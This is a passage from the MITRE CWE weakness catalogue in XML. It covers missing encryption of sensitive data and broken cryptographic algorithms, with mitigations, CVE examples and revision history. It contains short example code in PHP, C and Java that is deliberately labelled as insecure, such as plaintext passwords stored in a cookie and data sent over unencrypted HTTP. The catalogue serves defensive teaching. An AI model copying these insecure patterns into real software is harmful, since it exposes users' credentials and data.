								unauthorized disclosure or tampering </Text>
                  </Block>
                  <Text>Identify the separate needs and contexts for encryption:</Text>
                  <Block Block_Nature="List">
                     <Text>One-way (i.e., only the user or recipient needs to have the key).
								This can be achieved using public key cryptography, or other
								techniques in which the encrypting party (i.e., the software) does
								not need to have access to a private key.</Text>
                     <Text>Two-way (i.e., the encryption can be automatically performed on
								behalf of a user, but the key must be available so that the
								plaintext can be automatically recoverable by that user). This
								requires storage of the private key in a format that is recoverable
								only by the user (or perhaps by the operating system) in a way that
								cannot be recovered by others.</Text>
                  </Block>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-24">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When there is a need to store or transmit sensitive data, use strong,
							up-to-date cryptographic algorithms to encrypt that data. Select a
							well-vetted algorithm that is currently considered to be strong by
							experts in the field, and use well-tested implementations. As with all
							cryptographic mechanisms, the source code should be available for
							analysis.</Text>
                  <Text>For example, US government systems require FIPS 140-2
							certification.</Text>
                  <Text>Do not develop custom or private cryptographic algorithms. They will
							likely be exposed to attacks that are well-understood by cryptographers.
							Reverse engineering techniques are mature. If the algorithm can be
							compromised if attackers find out how it works, then it is especially
							weak.</Text>
                  <Text>Periodically ensure that the cryptography has not become obsolete.
							Some older algorithms, once thought to require a billion years of
							computing time, can now be broken in days or hours. This includes MD4,
							MD5, SHA1, DES, and other algorithms that were once regarded as strong.
							[R.311.5]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Separation of Privilege</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Compartmentalize the system to have "safe" areas where trust
							boundaries can be unambiguously drawn. Do not allow sensitive data to go
							outside of the trust boundary and always be careful when interfacing
							with a compartment outside of the safe area.</Text>
                  <Text>Ensure that appropriate compartmentalization is built into the system
							design and that the compartmentalization serves to allow for and further
							reinforce privilege separation functionality. Architects and designers
							should rely on the principle of least privilege to decide when it is
							appropriate to use and to drop system privileges.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When using industry-approved techniques, use them correctly. Don't cut
							corners by skipping resource-intensive steps (CWE-325). These steps are
							often essential for preventing common attacks.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use naming conventions and strong types to make it easier to spot when
							sensitive data is being used. When creating structures, objects, or
							other complex entities, separate the sensitive and non-sensitive data as
							much as possible.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This makes it easier to spot places in the code where data is being
							used that is unencrypted.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-40">
               <Intro_Text>This code writes a user's login information to a cookie so the user
						does not have to login again later. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>function persistLogin($username, $password){</Code>
                     <Block>
                        <Code> $data = array("username" =&gt; $username,
									"password"=&gt; $password);</Code>
                        <Code> setcookie ("userdata", $data); </Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The code stores the user's username and password in plaintext in a
							cookie on the user's machine. This exposes the user's login information
							if their computer is compromised by an attacker. Even if the user's
							machine is not compromised, this weakness combined with cross-site
							scripting (CWE-79) could allow an attacker to remotely copy the
							cookie.</Text>
                  <Text>Also note this example code also exhibits Plaintext Storage in a
							Cookie (CWE-315).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-41">
               <Intro_Text>The following code attempts to establish a connection, read in a
						password, then store it to a buffer.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>server.sin_family = AF_INET; hp = gethostbyname(argv[1]);</Code>
                     <Code>if (hp==NULL) error("Unknown host");</Code>
                     <Code>memcpy( (char *)&amp;server.sin_addr,(char
								*)hp-&gt;h_addr,hp-&gt;h_length);</Code>
                     <Code>if (argc &lt; 3) port = 80;</Code>
                     <Code>else port = (unsigned short)atoi(argv[3]);</Code>
                     <Code>server.sin_port = htons(port);</Code>
                     <Code>if (connect(sock, (struct sockaddr *)&amp;server, sizeof
								server) &lt; 0) error("Connecting");</Code>
                     <Code>...</Code>
                     <Code>while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {</Code>
                     <Block>
                        <Code/>
                        <Code>write(dfd,password_buffer,n);</Code>
                        <Code>...</Code>
                        <Code/>
                     </Block>
                  </Block>
                  <Text>While successful, the program does not encrypt the data before writing
							it to a buffer, possibly exposing it to unauthorized actors.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-42">
               <Intro_Text>The following code attempts to establish a connection to a site to
						communicate sensitive information.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>try {</Code>
                     <Block>
                        <Code>URL u = new URL("http://www.secret.example.org/");</Code>
                        <Code>HttpURLConnection hu = (HttpURLConnection)
									u.openConnection();</Code>
                        <Code>hu.setRequestMethod("PUT");</Code>
                        <Code>hu.connect();</Code>
                        <Code>OutputStream os = hu.getOutputStream(); </Code>
                        <Code>hu.disconnect();</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>catch (IOException e) {</Code>
                     <Block>
                        <Comment>//...</Comment>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>Though a connection is successfully made, the connection is
							unencrypted and it is possible that all sensitive data sent to or
							received from the server will be read by unintended actors.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2272</Observed_Example_Reference>
               <Observed_Example_Description>password and username stored in cleartext in a
						cookie</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1466</Observed_Example_Reference>
               <Observed_Example_Description>password stored in cleartext in a file with
						insecure permissions</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0152</Observed_Example_Reference>
               <Observed_Example_Description>chat program disables SSL in some circumstances
						even when the user says to use SSL.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1603</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product uses an incorrect public exponent
						when generating an RSA key, which effectively disables the
						encryption</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0964</Observed_Example_Reference>
               <Observed_Example_Description>storage of unencrypted passwords in a
						database</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-6157</Observed_Example_Reference>
               <Observed_Example_Description>storage of unencrypted passwords in a
						database</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-6828</Observed_Example_Reference>
               <Observed_Example_Description>product stores a password in cleartext in
						memory</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-1567</Observed_Example_Reference>
               <Observed_Example_Description>storage of a secret key in cleartext in a
						temporary file</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0174</Observed_Example_Reference>
               <Observed_Example_Description>SCADA product uses HTTP Basic Authentication,
						which is not encrypted</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5778</Observed_Example_Reference>
               <Observed_Example_Description>login credentials stored unencrypted in a registry
						key</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1949</Observed_Example_Reference>
               <Observed_Example_Description>Passwords transmitted in
						cleartext.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4122</Observed_Example_Reference>
               <Observed_Example_Description>Chain: Use of HTTPS cookie without "secure" flag
						causes it to be transmitted across unencrypted
						HTTP.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3289</Observed_Example_Reference>
               <Observed_Example_Description>Product sends password hash in cleartext in
						violation of intended policy.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4390</Observed_Example_Reference>
               <Observed_Example_Description>Remote management feature sends sensitive
						information including passwords in cleartext.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5626</Observed_Example_Reference>
               <Observed_Example_Description>Backup routine sends password in cleartext in
						email.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1852</Observed_Example_Reference>
               <Observed_Example_Description>Product transmits Blowfish encryption key in
						cleartext.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0374</Observed_Example_Reference>
               <Observed_Example_Description>Printer sends configuration information, including
						administrative password, in cleartext.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-4961</Observed_Example_Reference>
               <Observed_Example_Description>Chain: cleartext transmission of the MD5 hash of
						password enables attacks against a server that is susceptible to replay
						(CWE-294).</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-4786</Observed_Example_Reference>
               <Observed_Example_Description>Product sends passwords in cleartext to a log
						server.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3140</Observed_Example_Reference>
               <Observed_Example_Description>Product sends file with cleartext passwords in
						e-mail message intended for diagnostic purposes.
					</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.311.1">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 9, "Protecting Secret Data" Page
						299</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.311.2">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 17: Failure to Protect Stored Data." Page
						253</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.311.3">
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 10 - Missing Encryption of Sensitive
						Data</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-02-26</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/02/26/top-25-series-rank-10-missing-encryption-of-sensitive-data/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.311.4">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 2, "Common Vulnerabilities of Encryption", Page
						43.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-1" Local_Reference_ID="R.311.5">
               <Reference_Author>Information Technology Laboratory, National Institute of
						Standards and Technology</Reference_Author>
               <Reference_Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC
						MODULES</Reference_Title>
               <Reference_Date>2001-05-25</Reference_Date>
               <Reference_Link>http://csrc.nist.gov/publications/fips/fips140-2/fips1402.pdf</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Failure to encrypt data</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Insecure Cryptographic Storage</Mapped_Node_Name>
               <Mapped_Node_ID>A8</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Insecure Communications</Mapped_Node_Name>
               <Mapped_Node_ID>A9</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Insecure Storage</Mapped_Node_Name>
               <Mapped_Node_ID>A8</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Insufficient Transport Layer Protection </Mapped_Node_Name>
               <Mapped_Node_ID>4</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Use SSLSocket rather than Socket for secure data
						exchange</Mapped_Node_Name>
               <Mapped_Node_ID>MSC00-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Exposed Data</Mapped_Node_Name>
               <Mapped_Node_ID>SFP23</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>117</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>155</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>157</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>158</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>169</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>204</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>258</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>259</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>260</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>31</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>37</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>383</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>384</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>385</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>386</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>387</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>388</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>389</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>477</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>65</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>CLASP</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences,
						Other_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Demonstrative_Examples, Description, Detection_Factors,
						Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations,
						References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">Failure to Encrypt
						Data</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2010-02-16">Failure to Encrypt Sensitive
						Data</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="327" Name="Use of a Broken or Risky Cryptographic Algorithm" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The use of a broken or risky cryptographic algorithm is an
					unnecessary risk that may result in the exposure of sensitive
					information.</Description_Summary>
            <Extended_Description>
               <Text>The use of a non-standard algorithm is dangerous because a determined
						attacker may be able to break the algorithm and compromise whatever data has
						been protected. Well-known techniques may exist to break the
						algorithm.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>803</Relationship_Target_ID>
               <!--2010 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>693</Relationship_Target_ID>
               <!--Protection Mechanism Failure--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>310</Relationship_Target_ID>
               <!--Cryptographic Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>729</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A8 - Insecure Storage--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>PeerOf</Relationship_Nature>
               <Relationship_Target_ID>311</Relationship_Target_ID>
               <!--Missing Encryption of Sensitive Data--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>753</Relationship_Target_ID>
               <!--2009 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>816</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A7 - Insecure Cryptographic Storage--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>883</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 49 - Miscellaneous (MSC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>958</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Broken Cryptography--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>934</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A6 - Sensitive Data Exposure--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>Relationships between CWE-310, CWE-326, and CWE-327 and all their children
						need to be reviewed and reorganized.</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Background_Details>
            <Background_Detail>
               <Text>Cryptographic algorithms are the methods by which data is scrambled. There
						are a small number of well-understood and heavily studied algorithms that
						should be used by most applications. It is quite difficult to produce a
						secure algorithm, and even high profile algorithms by accomplished
						cryptographic experts have been broken.</Text>
               <Text>Since the state of cryptography advances so rapidly, it is common for an
						algorithm to be considered "unsafe" even if it was once thought to be
						strong. This can happen when new attacks against the algorithm are
						discovered, or if computing power increases so much that the cryptographic
						algorithm no longer provides the amount of protection that was originally
						thought.</Text>
            </Background_Detail>
         </Background_Details>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The confidentiality of sensitive data may be compromised by the use of
							a broken or risky cryptographic algorithm.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>The integrity of sensitive data may be compromised by the use of a
							broken or risky cryptographic algorithm.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
